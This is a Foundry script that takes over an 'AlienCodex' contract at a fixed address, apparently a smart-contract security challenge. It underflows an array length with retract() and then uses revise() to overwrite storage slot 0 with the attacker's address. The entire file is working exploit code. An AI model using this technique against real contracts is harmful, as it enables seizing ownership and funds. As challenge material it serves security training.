// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

contract AttackAlienCodex is Script {
    function run() external {
        // Start broadcasting the transaction
        vm.startBroadcast();

        address alienCodexAddress = 0xE5Aa2EC440cC863080232711428636C40363B5F8;

        // Check the current owner at slot 0 before the attack
        bytes32 ownerSlot0 = vm.load(alienCodexAddress, bytes32(uint256(0)));
        console.logBytes32(ownerSlot0);

        // Step 1: Make contact
        (bool success, ) = alienCodexAddress.call(
            abi.encodeWithSignature("makeContact()")
        );
        require(success, "makeContact() failed");

        // Step 2: Underflow the array length using retract()
        (bool success1, ) = alienCodexAddress.call(
            abi.encodeWithSignature("retract()")
        );
        require(success1, "retract() failed");

        // Step 3: Calculate the index to overwrite slot 0 (the owner address)
        // keccak256(slot 1) - the starting storage slot for the array
        uint256 arrayStorageStart = uint256(keccak256(abi.encode(uint256(1))));

        // Calculate the index for slot 0 (owner)
        uint256 ownerSlotIndex = type(uint256).max - arrayStorageStart + 1;

        // Your EOA address
        address newOwner = vm.envAddress("MY_EOA");

        // Step 4: Overwrite the owner in slot 0
        (bool success2, ) = alienCodexAddress.call(
            abi.encodeWithSignature(
                "revise(uint256,bytes32)",
                ownerSlotIndex,
                bytes32(uint256(uint160(newOwner)))
            )
        );
        require(success2, "revise() failed");

        // Check the new owner after the attack
        bytes32 newOwnerSlot0 = vm.load(alienCodexAddress, bytes32(uint256(0)));
        console.logBytes32(newOwnerSlot0);

        // Stop broadcasting
        vm.stopBroadcast();
    }
}
